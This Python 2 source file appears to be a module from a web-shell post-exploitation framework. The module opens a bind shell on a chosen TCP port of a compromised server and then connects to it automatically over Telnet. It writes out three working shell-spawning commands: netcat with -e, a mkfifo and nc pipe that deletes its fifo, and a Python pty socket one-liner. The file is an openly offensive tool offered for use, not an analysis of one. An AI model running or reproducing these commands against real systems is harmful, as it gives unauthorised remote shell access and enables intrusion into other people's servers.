from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.argparse import ArgumentParser
from urlparse import urlparse
from socket import error
from telnetlib import Telnet
from time import sleep
        

class Tcp(ModuleGuess):
    '''Open a shell on TCP port'''


        
    def _set_vectors(self):

        self.vectors.add_vector('netcat-traditional','shell.sh',  """nc -l -p $port -e $shell""")
        self.vectors.add_vector('netcat-bsd', 'shell.sh', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
        self.vectors.add_vector('python-pty','shell.sh',  """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", $port));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("/bin/bash");s.close()';""")
            


    def _set_args(self):
        self.argparser.add_argument('port', help='Port to open', type=int)
        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')

    def _prepare(self):
        self._result = ''
        
    def _execute_vector(self):
        self.current_vector.execute_background( { 'port': self.args['port'], 'shell' : self.args['shell'] })
        sleep(1)
        
    
    def _verify_vector_execution(self):
        
        if not self.args['no_connect']:
            
            urlparsed = urlparse(self.modhandler.url)
            if urlparsed.hostname:
                try:
                    Telnet(urlparsed.hostname, self.args['port']).interact()
                except error, e:
                    self._result += '%s: %s\n' % (self.current_vector.name, str(e))  
                    raise ExecutionException(self.name, str(e))
